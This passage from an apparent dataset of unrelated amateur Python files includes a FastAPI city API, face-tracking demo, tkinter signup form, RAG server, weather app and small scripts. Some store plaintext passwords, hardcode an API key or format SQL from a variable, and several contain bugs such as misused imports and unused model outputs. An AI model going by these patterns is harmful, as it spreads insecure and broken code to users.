db:Session=Depends(get_db)):\n    db_city = db.query(City).filter(City.name==name).first()\n    if db_city is None:\n        raise HTTPException(status_code=404, detail='City not found')\n    return db_city\n\n@app.put('/cities/{city_id}', response_model=CityResponse)\nasync def update_city(city_id:int, city_update:CityAdd, db:Session = Depends(get_db)):\n    db_city = db.query(City).filter(City.id==city_id).first()\n    if db_city is None:\n        raise HTTPException(status_code=404, detail='City not found')\n\n    for key, value in city_update.dict().items():\n        setattr(db_city, key, value)\n\n    db.commit()\n    return db_city\n\n@app.delete('/cities/{city_id}')\nasync def delete_city(city_id:int, db: Session=Depends(get_db)):\n    db_city = db.query(City).filter(City.id==city_id).first()\n\n    if db_city is None:\n        raise HTTPException(status_code=404, detail='city not found')\n\n    db.delete(db_city)\n    db.commit()\n    return {'message':'City deleted successfully'}\n\n@app.post('/nearest_cities/', response_model=list[CityResponse])\nasync def get_nearest_cities(nearest_city:NearestCity, db:Session = Depends(get_db)):\n    cities = db.query(City).all()\n\n    city_distances = []\n    for city in cities:\n        distance = geodesic((nearest_city.latitude, nearest_city.longitude), (city.latitude, city.longitude)).kilometers\n        city_distances.append({'city':city, 'distance':distance})\n\n    #sort\n    sorted_cities = sorted(city_distances, key=lambda x: x['distance'])\n    nearest_cities = sorted_cities[:2]\n\n    response_data = []\n    for city_data in nearest_cities:\n        city = city_data['city']\n        response_data.append({\n            'id':city.id,\n            'name':city.name,\n            'latitude':city.latitude,\n            'longitude': city.longitude,\n            'distance': city_data['distance']\n        })\n    return response_data\n\nif __name__=='__main__':\n    import uvicorn\n    uvicorn.run(app,host=\"127.0.0.1\", port=8000)\n\n\n\n\n\n\n\n\n\n",
    "import cv2\nimport dlib\nimport numpy as np\n\ndetector = dlib.get_frontal_face_detector()\n\n\ndef face_locate(img):\n    dets = detector(img, 0)\n    if not dets:\n        return None\n    return max(dets, key=lambda det: (det.right() - det.left()) * (det.bottom() - det.top()))\n\n\npredictor = dlib.shape_predictor('shape_predictor_68_face_landmarks.dat')\n\n\ndef get_key_points(img, face_pos):\n    landmark_shape = predictor(img, face_pos)\n    key_points = []\n    for i in range(68):\n        pos = landmark_shape.part(i)\n        key_points.append(np.array([pos.x, pos.y], dtype=np.float32))\n    return key_points\n\n\ndef generate_points(key_points):\n    def centre(index_array):\n        return sum([key_points[i] for i in index_array]) / len(index_array)\n    l_brow = [18, 19, 20, 21]\n    r_brow = [22, 23, 24, 25]\n    Chin_ = [6, 7, 8, 9, 10]\n    nose_ = [29, 30]\n    return centre(l_brow + r_brow), centre(Chin_), centre(nose_)\n\n\ndef generate_features(points):\n    _browcentre, Chin_centre, nose_centre = points\n    \u4e2d\u7ebf = _browcentre - Chin_centre\n    \u659c\u8fb9 = _browcentre - nose_centre\n    H_Rotate_amount = np.cross(\u4e2d\u7ebf, \u659c\u8fb9) / np.linalg.norm(\u4e2d\u7ebf)**2\n    V_Rotate_amount = \u4e2d\u7ebf @ \u659c\u8fb9 / np.linalg.norm(\u4e2d\u7ebf)**2\n    return np.array([H_Rotate_amount, V_Rotate_amount])\n\n\ndef draw(H_Rotate_amount, V_Rotate_amount):\n    img = np.ones([512, 512], dtype=np.float32)\n    face_length = 200\n    centre = 256, 256\n    l_eye = int(220 + H_Rotate_amount * face_length), int(249 + V_Rotate_amount * face_length)\n    r_eye = int(292 + H_Rotate_amount * face_length), int(249 + V_Rotate_amount * face_length)\n    mouth = int(256 + H_Rotate_amount * face_length / 2), int(310 + V_Rotate_amount * face_length / 2)\n    cv2.circle(img, centre, 100, 0, 1)\n    cv2.circle(img, l_eye, 15, 0, 1)\n    cv2.circle(img, r_eye, 15, 0, 1)\n    cv2.circle(img, mouth, 5, 0, 1)\n    return img\n\n\ndef get_img_features(img):\n    face_pos = face_locate(img)\n    if not face_pos:\n        cv2.imshow('self', img)\n        cv2.waitKey(1)\n        return None\n    key_points = get_key_points(img, face_pos)\n    # for i, (px, py) in enumerate(key_points):\n    #     cv2.putText(img, str(i), (int(px),int(py)), cv2.FONT_HERSHEY_COMPLEX, 0.25, (255, 255, 255))\n    points = generate_points(key_points)\n    # for i, (px, py) in enumerate(points):\n    #     cv2.putText(img, str(i), (int(px),int(py)), cv2.FONT_HERSHEY_COMPLEX, 0.25, (255, 255, 255))\n    Rotate_amounts = generate_features(points)\n    # cv2.putText(img, '%.3f' % \u65cb\u8f6c\u91cf,\n    #             (int(points[-1][0]), int(points[-1][1])), cv2.FONT_HERSHEY_COMPLEX, 0.5, (255, 255, 255))\n    cv2.imshow('self', img)\n    return Rotate_amounts\n\n\nif __name__ == '__main__':\n    cap = cv2.VideoCapture(0)\n    origin_features = get_img_features(cv2.imread('std_face.jpg'))\n    features = origin_features - origin_features\n    while True:\n        ret, img = cap.read()\n        # img = cv2.flip(img, 1)\n        new_features = get_img_features(img)\n        if new_features is not None:\n            features = new_features - origin_features\n        H_Rotate_amount, V_Rotate_amount = features\n        cv2.imshow('Vtuber', draw(H_Rotate_amount, V_Rotate_amount))\n        cv2.waitKey(1)\n",
    "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Sat Mar 30 09:53:00 2024\n  **** signup ****\n@author: Riyaz\n\"\"\"\n#required module\nimport tkinter as tk\nfrom PIL import ImageTk\nimport random as rd\nfrom tkinter import messagebox\nimport mysql.connector\n# database connectivity\nconnect=mysql.connector.connect(host=\"localhost\",user=\"root\",password=\"\",port='3306',database=\"signup\")\nif connect.is_connected():\n    pass\nelse:\n    messagebox.showwarning('not connected','dbs not connected')\nc=connect.cursor()\nw=tk.Tk()\n# window function\ndef window():\n    global e1,e2,e3,b1,b2,connection,c\n    w.title('signup')\n    w.geometry('1000x670+200+0')\n    w.resizable(False,False)\n    w.configure(bg='white')\n    #w.mainloop()\n    w.configure(bg='white')\ndef dataentry():\n    email=s1.get()\n    name=s2.get()\n    password=s3.get()\n    if email.endswith('@gmail.com'):\n        pass \n    else:\n        messagebox.showerror('invalid format','invalid email format')\n    if email==\"\" or password==\"\" or name==\"\":\n        messagebox.showerror('invalid','enter all details')\n    else:\n        messagebox.showinfo('submited','submitted successfully')\n        insert_values=\"INSERT INTO `formdetails`(`Email`, `username`, `password`) VALUES (%s,%s,%s)\"\n        vals=(email,name,password)\n        c.execute(insert_values,vals)\n        connect.commit()\ndef clear():\n    global e1,e2,e3\n    e1.delete(0,'end')\n    e2.delete(0,'end')\n    e3.delete(0,'end')\n    passl.configure(text=\"\")\ndef show():\n    global img_button,image,e3\n    e3.configure(show='')\n    image=ImageTk.PhotoImage(file='D:\\\\python programs\\\\nohideicon.png')\n    img_button.configure(image=image,command=hide)\ndef hide():\n    global img_button,image2,e2\n    e3.configure(show='*')\n    image2=ImageTk.PhotoImage(file='D:\\\\python programs\\\\hideicon.png')\n    img_button.configure(image=image2,command=show)\ndef suggest():\n    global e3\n    A=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    B=A.lower()\n    digit=\"1234567890\"\n    special=\"!@#$%^&*()_+{}:?><.,\\/\"\n    defined_pass=A+B+digit+special \n    current_password=\"\"\n    for i in range(8):\n        current_password+=rd.choice(defined_pass)\n    passl.configure(text=current_password)\ndef design():\n    global e1,e2,e3,l5,passl\n    photo=tk.PhotoImage(file='loginimage2.png')\n    l1=tk.Label(w,image=photo,bg='white',width=400,height=300)\n    l1.place(x=40,y=120)\n    frame=tk.Frame(w,width=460,height=540,bg='white',bd=0)\n    frame.place(x=450,y=60)\n    # heading lable\n    head_lable=tk.Label(frame,text='Sign up',fg='black',bg='white',font=('microsoft yahi ui light',40,'bold'))\n    head_lable.place(x=120,y=2)\n    l3=tk.Label(frame,text='Email',fg='black',bg='white',font=('microsoft yahi ui light',14))\n    l3.place(x=75,y=100)\n    e1=tk.Entry(frame,width=22,bg='white',fg='black',font=('microsoft yahi ui light',14),bd=0,textvariable=s1)\n    e1.place(x=80,y=130)\n    lframe=tk.Frame(frame,width=265,height=2,bg='black')\n    lframe.place(x=80,y=152)\n    l4=tk.Label(frame,text='Username',fg='black',bg='white',font=('microsoft yahi ui light',14))\n    l4.place(x=74,y=190)\n    e2=tk.Entry(frame,bg='white',fg='black',font=('microsoft yahi ui light',14),bd=0,textvariable=s2)\n    e2.place(x=80,y=220)\n    l2frame=tk.Frame(frame,width=265,height=2,bg='black')\n    l2frame.place(x=80,y=250)\n    #passsword\n    l5=tk.Label(frame,text='password',fg='black',bg='white',font=('microsoft yahi ui light',14))\n    l5.place(x=74,y=280)\n    e3=tk.Entry(frame,bg='white',show='*',fg='black',font=('microsoft yahi ui light',14),bd=0,textvariable=s3)\n    e3.place(x=80,y=310)\n    l2frame=tk.Frame(frame,width=265,height=2,bg='black')\n    l2frame.place(x=80,y=340)\n    #suggest me a password\n    password_suggest=tk.Button(frame,text='Suggest password',bg='white',fg='blue',bd=0,font=('microsoft yahi ui light',11,'bold'),command=suggest)\n    password_suggest.place(x=70,y=370)\n    #pass lable \n    passl=tk.Label(frame,bg=\"white\",fg=\"black\",font=('microsoft yahi ui light',14,'bold')) \n    passl.place(x=260,y=370)\n    #button\n    b1=tk.Button(frame,width=10,text='signup',bg='green',fg='white',font=('microsoft yahi ui light',14),bd=0,command=dataentry)\n    b1.place(x=80,y=440)\n    b2=tk.Button(frame,width=10,text='Reset',bg='blue',fg='white',font=('microsoft yahi ui light',14),bd=0,command=clear)\n    b2.place(x=220,y=440)\n    global img_button,image2\n    image2=ImageTk.PhotoImage(file='D:\\\\python programs\\\\hideicon.png')\n    img_button=tk.Button(w,image=image2,bg='white',bd=0,command=show)\n    img_button.place(x=810,y=370)\n    w.mainloop()\ns1=tk.StringVar()\ns2=tk.StringVar()\ns3=tk.StringVar()\nwindow()\ndesign()\n\n",
    "####################################################################################### \r\n### SCROLL DOWN TO THE END OF THE PAGE TO FIND WHAT YOU ARE PROBABLY LOOKING FOR :) ###  \u2190----\r\n#######################################################################################  \r\n\r\nimport os\r\nimport re\r\n\r\ndef parse_line(lines, prefix):\r\n    for line in lines:\r\n        if line.startswith(prefix):\r\n            return line.strip().replace(prefix, \"\").strip()\r\n    return \"\"\r\n\r\ndef parse_content(lines):\r\n    content = \"\"\r\n    ul_open = False  # flag to track if <ul> tag is open\r\n    for line in lines:\r\n        if not any(line.startswith(prefix) for prefix in [\"title:\", \"subtitle:\", \"author:\", \"date:\"]):\r\n\r\n            # converts some \"markers\" to HTML tags\r\n            line = re.sub(r'\\/\\*\\/(.*?)\\/\\*\\/', r'<b>\\1</b>', line)  # Bold\r\n            line = re.sub(r'\\/\\/\\/(.*?)\\/\\/\\/', r'<i>\\1</i>', line)  # Italics\r\n            line = re.sub(r'\\/\\_\\/(.*?)\\/\\_\\/', r'<u>\\1</u>', line)  # Underline\r\n            line = re.sub(r'\\/\\~\\/(.*?)\\/\\~\\/', r'<del>\\1</del>', line)  # Crossed\r\n            line = re.sub(r'\\/\\#\\/(.*?)\\/\\#\\/', r'<code>\\1</code>', line)  # Monospace\r\n            line = re.sub(r'\\/\\!\\/(.*?)\\/\\!\\/', r'<mark>\\1</mark>', line)  # Marked\r\n            line = re.sub(r'\\/\\\u00a7\\/ (.*?)', r'&emsp;\\1', line)  # Indentation\r\n            line = re.sub(r'\\/\\,\\/(.*?)', r'<hr>', line)  # HR Line   \r\n\r\n            # converts headings into HTML headings\r\n            line = re.sub(r'\\/\\#1\\/(.*?)\\/\\#1\\/', r'<h1>\\1</h1>', line)  # h1\r\n            line = re.sub(r'\\/\\#2\\/(.*?)\\/\\#2\\/', r'<h2>\\1</h2>', line)  # h2\r\n            line = re.sub(r'\\/\\#3\\/(.*?)\\/\\#3\\/', r'<h3>\\1</h3>', line)  # h3\r\n            line = re.sub(r'\\/\\#4\\/(.*?)\\/\\#4\\/', r'<h4>\\1</h4>', line)  # h4\r\n            line = re.sub(r'\\/\\#5\\/(.*?)\\/\\#5\\/', r'<h5>\\1</h5>', line)  # h5\r\n            line = re.sub(r'\\/\\#6\\/(.*?)\\/\\#6\\/', r'<h6>\\1</h6>', line)  # h6   \r\n\r\n            # handles UL and LI markers\r\n            if line.startswith(\"/=/\"):  # UL\r\n                if not ul_open:\r\n                    content += \"<ul>\\n\"\r\n                    ul_open = True\r\n            elif line.startswith(\"/-/\"):  # LI\r\n                content += f\"<li>{line[3:]}</li>\\n\"\r\n            else:\r\n                # closes UL if it's open and not UL or LI\r\n                if ul_open:\r\n                    content += \"</ul>\\n\"\r\n                    ul_open = False\r\n                content += line\r\n\r\n    # closes UL if it's still open after processing all lines\r\n    if ul_open:\r\n        content += \"</ul>\\n\"\r\n\r\n    return content.strip()\r\n\r\ndef format_paragraphs(content):\r\n    paragraphs = content.split('\\n\\n')\r\n    html_paragraphs = \"\"\r\n    for paragraph in paragraphs:\r\n        html_paragraphs += f\"<p>{paragraph}</p>\\n\\n\"\r\n    return html_paragraphs\r\n\r\ndef create_html_from_text(text_file, existing_html_file):\r\n    # checks if the file exists\r\n    if not os.path.exists(text_file):\r\n        print(f\"Error: File '{text_file}' not found.\")\r\n        return\r\n    if not os.path.exists(existing_html_file):\r\n        print(f\"Error: File '{existing_html_file}' not found.\")\r\n        return\r\n\r\n    # reads the content of the text file\r\n    with open(text_file, 'r', encoding='utf-8') as file:\r\n        lines = file.readlines()\r\n\r\n    # parses tags\r\n    title = parse_line(lines, \"title:\")\r\n    subtitle = parse_line(lines, \"subtitle:\")\r\n    author = parse_line(lines, \"author:\")\r\n    date = parse_line(lines, \"date:\")\r\n    content = parse_content(lines)\r\n    formatted_content = format_paragraphs(content)\r\n\r\n    # reads the HTML file\r\n    with open(existing_html_file, 'r', encoding='utf-8') as html_file:\r\n        html_content = html_file.read()\r\n\r\n    # inserts content into the <article> tag of the HTML fil\u011b\r\n    article_start = html_content.find(\"<article>\") + len(\"<article>\")\r\n    article_end = html_content.find(\"</article>\")\r\n    html_content = html_content[:article_start] + f\"\"\"\r\n    <h1>{title}</h1>\r\n    <p style=\"color:#313131; font-size:18px\">{subtitle}</p>\r\n    <p><i>{author}</i> | {date}</p>\r\n    {formatted_content}\r\n\r\n    \"\"\" + html_content[article_end:]\r\n\r\n    # writes updated HTML content into the HTML file\r\n    with open(existing_html_file, 'w', encoding='utf-8') as html_file:\r\n        html_file.write(html_content)\r\n\r\n    print(f\"content has been inserted into '{existing_html_file}' successfully.\")\r\n\r\nif __name__ == \"__main__\":\r\n    text_file = \"input2.skt\" ### CHANGE THIS TO THE INPUT .SKT FILE ### \u2190----\r\n    existing_html_file = \"page.html\" ### CHANGE THIS TO THE OUTPUT HTML FILE ### \u2190----\r\n    create_html_from_text(text_file, existing_html_file)\r\n\r\n####################################################################################### \r\n### ABOVE ME IS PROBABLY* WHAT YOU ARE LOOKING FOR, THE OUTPUT & INPUT VARIABLES :) ###  \u2190----\r\n#######################################################################################  ",
    "import os\nimport sys\nimport uuid\nimport chromadb\nfrom langchain import hub\nfrom langchain_openai import OpenAIEmbeddings\nfrom langchain_community.vectorstores import Chroma\nfrom langchain_text_splitters import RecursiveCharacterTextSplitter\nfrom langchain_community.document_loaders import DirectoryLoader, PythonLoader\nfrom langchain.retrievers.multi_vector import MultiVectorRetriever\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.runnables import RunnablePassthrough\nfrom langchain.storage import InMemoryByteStore\nfrom langchain_openai import ChatOpenAI\nfrom langchain_core.runnables import RunnableParallel\nfrom flask import Flask, request\nfrom api_key import OPENAI_API_KEY\n\nos.environ[\"OPENAI_API_KEY\"] = OPENAI_APIKEY\n\napp = Flask(__name__)\n\nHOST = \"0.0.0.0\"\nPORT = 9600\n\ndef produce_rag_chain():\n    llm = ChatOpenAI(model=\"gpt-4-1106-preview\")\n    loader1 = DirectoryLoader('./ml-engineering', glob=\"**/*.md\")\n    loader2 = DirectoryLoader('./ml-engineering', glob=\"**/*.py\", loader_cls=PythonLoader)\n    docs = loader1.load() + loader2.load()\n    text_splitter = RecursiveCharacterTextSplitter(chunk_size=10000, chunk_overlap=200)\n    splits = text_splitter.split_documents(docs)\n    persistent_client = chromadb.PersistentClient(path=\"./chroma_db_2\")\n    collection = persistent_client.get_or_create_collection(\"stas00_articles\")\n\n    vectorstore = Chroma(\n        client=persistent_client,\n        collection_name=\"stas00_articles\",\n        embedding_function=OpenAIEmbeddings(model=\"text-embedding-3-large\", disallowed_special=()),\n    )\n\n    store = InMemoryByteStore()\n    id_key = \"doc_id\"\n\n    retriever = MultiVectorRetriever(\n        vectorstore=vectorstore,\n        docstore=store,\n        id_key=id_key,\n    )\n\n    doc_ids = [str(uuid.uuid4()) for _ in docs]\n\n    child_text_splitter = RecursiveCharacterTextSplitter(chunk_size=1000)\n\n    sub_docs = []\n    for i, doc in enumerate(docs):\n        _id = doc_ids[i]\n        _sub_docs = child_text_splitter.split_documents([doc])\n        for _doc in _sub_docs:\n            _doc.metadata[id_key] = _id\n        sub_docs.extend(_sub_docs)\n\n    retriever.vectorstore.add_documents(sub_docs)\n    print(\"Count of sub-docs\", len(sub_docs))\n    retriever.docstore.mset(list(zip(doc_ids, docs)))\n\n    prompt = hub.pull(\"rlm/rag-prompt\")\n\n    def format_docs(docs):\n        return \"\\n\\n\".join(doc.page_content for doc in docs)\n\n    rag_chain_from_docs = (\n        RunnablePassthrough.assign(context=(lambda x: format_docs(x[\"context\"])))\n        | prompt\n        | llm\n        | StrOutputParser()\n    )\n\n    rag_chain_with_source = RunnableParallel(\n        {\"context\": retriever, \"question\": RunnablePassthrough()}\n    ).assign(answer=rag_chain_from_docs)\n\n    return rag_chain_with_source\n\nrag_chain = produce_rag_chain()\n\n@app.route('/ask', methods=[\"GET\"])\ndef get_historical_ids():\n    query = request.args.get(\"query\")\n    answer = rag_chain.invoke(query)\n    sources = [answer['context'][i].metadata['source'] for i in range(len(answer['context']))]\n    return {'answer': answer['answer'], 'sources': sources}\n\nif __name__ == '__main__':\n    app.run(host=HOST, port=PORT)",
    "tasks = []\n\ndef main():\n  \n  message =\"\"\"\n  1- add taske to a list \n  2- mark task as complete\n  3- view tasks\n  4- quit\"\"\"\n \n  while True:\n    print(message)\n    choice = input(\"enter your choice: \")\n  \n    if choice == \"1\":\n      add_task()\n    elif choice == \"2\":\n      mark_task_complete()\n    elif choice == \"3\":\n      view_tasks(tasks)\n    elif choice == \"4\":\n      break\n    else:\n      print(\"invalid choice , please enter a number between 1 and 4\")\n  \ndef add_task():\n  # get task from user \n  task = input(\"Enter a task: \")\n  \n  # defin task status as not completed\n  task_info = {\"task\": task, \"completed\": False} \n  \n  # add task to the list of tasks\n  tasks.append(task_info)\n  print(\"task addes to the list succesfully\")\n  \ndef mark_task_complete():\n  # get list of incomplete tasks \n  incomplete_tasks = [task for task in tasks if task[\"completed\"] == False]\n  \n  # if len (incomplete_tasks) == 0:\n  #   print(\"no tasks to mark as complete\")\n  #   return\n  # \"\u064a\u0642\u0648\u0645 \u0627\u0644\u0643\u0648\u062f \u0627\u0644\u062a\u0627\u0644\u0649 \u0628\u0646\u0641\u0633 \u0645\u0647\u0645\u0629 \u0627\u0644\u0643\u0648\u062f \u0627\u0644\u0633\u0627\u0628\u0642 \"\u062a\u0623\u0643\u062f \u0645\u0646 \u0648\u062c\u0648\u062f \u0645\u0647\u0627\u0645 \u0644\u062a\u0645\u0643\u064a\u0646\u0647\u0627\n  if not incomplete_tasks:\n    print(\"no tasks to mark as complete\")\n    return\n    \n  # show incompleted tasks to user\n  for i, task in enumerate(incomplete_tasks):\n    print(f\"{i+1}- {task['task']}\")\n    print(\"-\"*30)\n    \n  # get task index from user\n  try:\n    task_index = int(input(\"Enter task number to complete: \"))\n    # mark task as complete\n    incomplete_tasks[task_index -1][\"completed\"] = True\n    # print message to user \n    print(\"task marked as complete\")\n  except ValueError:\n    print(\"invalid input , please enter a number\")\n  except IndexError:\n    print(\"pleas enter a number between 1 and\", len(incomplete_tasks))\n          \ndef view_tasks(tasks_list):\n  # if there are no tasks to view, print message & return\n  if not tasks_list:\n    print (\"No tasks to view\")\n    return\n  for i, task in enumerate(tasks_list):\n  #   if task[\"completed\"]:\n  #     status = \"\u2714\"\n  #   else:\n  #     status = \"\u274c\"\n  # \u064a\u0642\u0648\u0645 \u0627\u0644\u0643\u0648\u062f \u0627\u0644\u062a\u0627\u0644\u0649 \u0628\u0646\u0641\u0633 \u0645\u0647\u0645\u0629 \u0627\u0644\u0643\u0648\u062f \u0627\u0644\u0633\u0627\u0628\u0642 \u0639\u0631\u0636 \u062d\u0627\u0644\u0629 \u0627\u0644\u0645\u0647\u0645\u0629 \n    status = \"\u2714\" if task[\"completed\"] else \"\u274c\"\n    print(f\"{i+1}.{task['task']}{status}\")\n\nif __name__ == \"__main__\" :\n  main()\n  \n\n\n    \n  ",
    "import os \nimport psycopg2\n\ndef send_alert(organization_id, balance_change_rate, balance, previous_balance):\n    print(f\"Organization {organization_id} has experienced a ({balance_change_rate}%) change in balance from {previous_balance} to {balance}.\")\n\ndef main():\n    # Define your PostgreSQL connection parameters\n    conn_params = {\n        \"host\": \"db\",\n        \"database\": \"customer\",\n        \"user\": \"postgres\",\n        \"password\": \"postgres\",\n    }\n\n    # Check if an environment variable is defined\n    if 'FACT_TABLE_FOR_ALERTS' in os.environ:\n        fact_table = os.environ['FACT_TABLE_FOR_ALERTS']\n    else:\n        fact_table = 'customer.analytics.fact_organization_daily_metrics'\n\n    # Connect to the PostgreSQL database\n    conn = psycopg2.connect(**conn_params)\n    cursor = conn.cursor()\n\n    # Query for detecting significant balance changes\n    query = \"\"\"\n        select organization_id, balance_change_rate, previous_balance, balance\n        from {} organization_daily_metrics\n        where recorded_date = current_date\n    \"\"\"\n\n    # Execute the query\n    cursor.execute(query.format(fact_table))\n\n    # Fetch all rows\n    rows = cursor.fetchall()\n\n    # Check for significant balance changes\n    for row in rows:\n        organization_id, balance_change_rate, previous_balance, balance = row\n\n        if balance_change_rate is not None and abs(balance_change_rate) >= 0.5:\n            send_alert(organization_id, balance_change_rate, previous_balance, balance)\n        else:\n            pass\n        \n    # Close cursor and connection\n    cursor.close()\n    conn.close()\n\nif __name__ == \"__main__\":\n    main()\n",
    "import requests\r\nfrom flask import Flask, render_template, request, get\r\nimport json\r\n\r\n\r\napp = Flask(__name__)\r\n\r\napi_key = 'a7ef70cdd2820aed218a6f7031672783'\r\n\r\n@app.route(\"/\", methods=['GET', 'POST'])\r\n\r\ndef index():\r\n    if request.method ==  'POST':\r\n        city = request.form['city']\r\n        weather_data = get_weather(city)\r\n        return render_template('index.html', weather_data=weather_data)\r\n    return render_template('index.html', weather_data=None)\r\n\r\ndef get_weather(city):\r\n    try:\r\n        url = f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}&units=metric'\r\n        response = request.get(url)\r\n        weather_data = response.json()\r\n        temperature = weather_data['main']['temp']\r\n        description = weather_data['weather'][0]['description']\r\n        city_name = weather_data['name']\r\n        country_code = weather_data['sys']['country']\r\n\r\n        weather_info = f'{description.capitalize()}, in {city_name}, {country_code}. Temperature: {temperature}C'\r\n        #{description.capitalize()}, ??\r\n\r\n        return weather_info\r\n    except Exception as e:\r\n        return f'Error finding weather data: {e}'\r\n    \r\n    if __name__ == '__main__':\r\n        app.run(debug=True)\r\n",
    "import numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\nfrom torch.nn.utils import weight_norm\r\n\r\nclass Chomp1d(nn.Module):\r\n    def __init__(self, chomp_size):\r\n        super(Chomp1d, self).__init__()\r\n        self.chomp_size = chomp_size\r\n\r\n    def forward(self, x):\r\n        return x[:, :, :-self.chomp_size].contiguous()\r\n\r\n\r\nclass TemporalBlock(nn.Module):\r\n    def __init__(self, n_inputs, n_outputs, kernel_size, stride, dilation, padding, dropout=0.2):\r\n        \"\"\"\r\n        \u76f8\u5f53\u4e8e\u4e00\u4e2aResidual block\r\n\r\n        :param n_inputs: int, Number of input channels\r\n        :param n_outputs: int, int, Number of output channels\r\n        :param kernel_size: int, The size of convolutional kernel\r\n        :param stride: int\r\n        :param dilation: int\r\n        :param padding: int\r\n        :param dropout: float\r\n        \"\"\"\r\n        super(TemporalBlock, self).__init__()\r\n        self.conv1 = weight_norm(nn.Conv1d(n_inputs, n_outputs, kernel_size,\r\n                                           stride=stride, padding=padding, dilation=dilation))\r\n        self.chomp1 = Chomp1d(padding)\r\n        self.relu1 = nn.ReLU()\r\n        self.dropout1 = nn.Dropout(dropout)\r\n\r\n        self.conv2 = weight_norm(nn.Conv1d(n_outputs, n_outputs, kernel_size,\r\n                                           stride=stride, padding=padding, dilation=dilation))\r\n        self.chomp2 = Chomp1d(padding)  \r\n        self.relu2 = nn.ReLU()\r\n        self.dropout2 = nn.Dropout(dropout)\r\n\r\n        self.net = nn.Sequential(self.conv1, self.chomp1, self.relu1, self.dropout1,\r\n                                 self.conv2, self.chomp2, self.relu2, self.dropout2)\r\n        self.downsample = nn.Conv1d(n_inputs, n_outputs, 1) if n_inputs != n_outputs else None\r\n        self.relu = nn.ReLU()\r\n        self.init_weights()\r\n\r\n    def init_weights(self):\r\n\r\n        self.conv1.weight.data.normal_(0, 0.01)\r\n        self.conv2.weight.data.normal_(0, 0.01)\r\n        if self.downsample is not None:\r\n            self.downsample.weight.data.normal_(0, 0.01)\r\n\r\n    def forward(self, x):\r\n\r\n        out = self.net(x)\r\n        res = x if self.downsample is None else self.downsample(x)\r\n        return self.relu(out + res)\r\n\r\n\r\nclass TemporalConvNet_GRU(nn.Module):\r\n    def __init__(self, num_inputs=4, num_channels=[32, 32, 32, 32], kernel_size=3, dropout=0):\r\n        \"\"\"\r\n        :param num_inputs: int\uff0c Number of input channels\r\n        :param num_channels: list\uff0cNumber of hidden channel in each layer\r\n        :param kernel_size: int\r\n        :param dropout: float\r\n        \"\"\"\r\n        super(TemporalConvNet_GRU, self).__init__()\r\n        layers = []\r\n        num_levels = len(num_channels)\r\n        for i in range(num_levels):\r\n            dilation_size = 2 ** i  \r\n            in_channels = num_inputs if i == 0 else num_channels[i - 1]  \r\n            out_channels = num_channels[i] \r\n            layers += [TemporalBlock(in_channels, out_channels, kernel_size, stride=1, dilation=dilation_size,\r\n                                     padding=(kernel_size - 1) * dilation_size, dropout=dropout)]\r\n\r\n        self.network = nn.Sequential(*layers)\r\n        self.gru = nn.GRU(32, 32, 1, batch_first=True)\r\n        self.linear = nn.Linear(num_channels[-1], 6)\r\n\r\n    def forward(self, x):\r\n        \"\"\"\r\n        :param x: size of (Batch, input_channel, seq_len)\r\n        :return: size of (Batch, output_channel, seq_len)\r\n        \"\"\"\r\n        x = x.permute(0, 2, 1)\r\n        out = self.network(x)\r\n        gru_input = out.permute(0, 2, 1)\r\n        output,hn = self.gru(gru_input)\r\n        return out[:, :, -1]\r\n",
    "Progress = 0            # opening a 0 variable to modify within the loop and calculate the total Progress\nTrailer = 0               # opening a 0 variable to modify within the loop and calculate the total module trailer \nRetriever = 0           # opening a 0 variable to modify within the loop and calculate the total module Retriever\nExclude = 0             # opening a 0 variable to modify within the loop and calculate the total Exclude\ntotal = 0                  # opening a 0 variable to modify eithin loop and calculate total\n\ndef credits(Pass_MR, Defer_MR, Fail_MR, total):                         #defining a function : it will tells python name of the function and if applicable what kind of information the function needs to  do its job\n    \n    if Pass_MR + Defer_MR + Fail_MR == 120: \n\n        if Pass_MR == 120 and Defer_MR == 0 and Fail_MR == 0:        # condition for print Progress\n            print(\"Progress\\n\")\n            global Progress \n            Progress = Progress + 1\n\n        elif Pass_MR == 100 and (Defer_MR in(0, 20))and (Fail_MR in(0, 20)):           #condition for print module Trailer\n            print(\"Progress (module trailer)\\n\")\n            global Trailer\n            Trailer = Trailer + 1\n\n        elif (Pass_MR in (0, 20, 40, 60, 80)) and (Fail_MR in (0, 20, 40, 60)):              # condition for print module Retriever\n            print(\"Do not progress-module retriever\\n\")\n            global Retriever\n            Retriever = Retriever + 1\n\n        elif (Pass_MR in (40, 20, 0)) and (Defer_MR in (0, 20, 40)) and (Fail_MR in (80, 100, 120)):           #condition for print Exclude\n            print(\"Exclude\\n\")\n            global Exclude\n            Exclude = Exclude + 1\n\n    else:\n        print('Total incorrect')       # if total is less than or greater than 120 print \"Total Incorrecect\"\n\n# we are useing while loop if user needs to continue the program and get the credits of multiple students\nvalid = True\nwhile valid == True:\n    while True:\n        try:                                                                      # useing try and except method to correct the Value error                                                                  \n            Pass_MR = int(input('Please Enter Your Pass Marks : '))              # get the input from users\n            if (Pass_MR in [0,20,40,60,80,100,120]):\n                break\n            else:           \n                print('Out of range')\n        except ValueError:\n            print('Integer required')\n\n    while True:\n        try:                                                                            # useing try and except method to correct the Value error  \n            Defer_MR = int(input('Please Enter Your Defer marks : '))           # get the input from users\n            if (Defer_MR in [0,20,40,60,80,100,120]):\n                break\n            else:\n                print('Out of range')\n        except ValueError:\n            print('Integer required')\n\n\n    while True:\n        try:                                                                       # useing try and except method to correct the Value error  \n            Fail_MR = int(input('Please Enter Your Fail Marks : '))                # get the input from users\n            if (Fail_MR in [0,20,40,60,80,100,120]):\n                break\n            else:\n                print('Out of range')\n        except ValueError:\n            print('Integer required')\n\n    credits(Pass_MR,Defer_MR,Fail_MR,total)                  # calling the def function\n\n    correct= True\n    while correct == True:\n        print(\"\\nWould you like to enter another set of data ?\")\n        option = input(\"Enter 'y' for Continue the programe or 'q' to Quit the programe and view results : \")    #getting the option input from user\n\n        if option == \"y\":\n            correct = False\n        elif option == \"q\":\n            correct = False\n            valid = False\n        else:\n            print(\"Plese Enter Valid Input\")\n\nprint()\n\nprint(\"-\" * 150)\nprint(\"Histrogram\") #print the histrogram\nprint()\n\nprint(\"Progress\", Progress, \":\", \"*\" * Progress)\nprint(\"Trailer\", Trailer, \":\", \"*\" * Trailer)\nprint(\"Retriever\", Retriever, \":\", \"*\" * Retriever)\nprint(\"Exclude\", Exclude, \":\", \"*\" 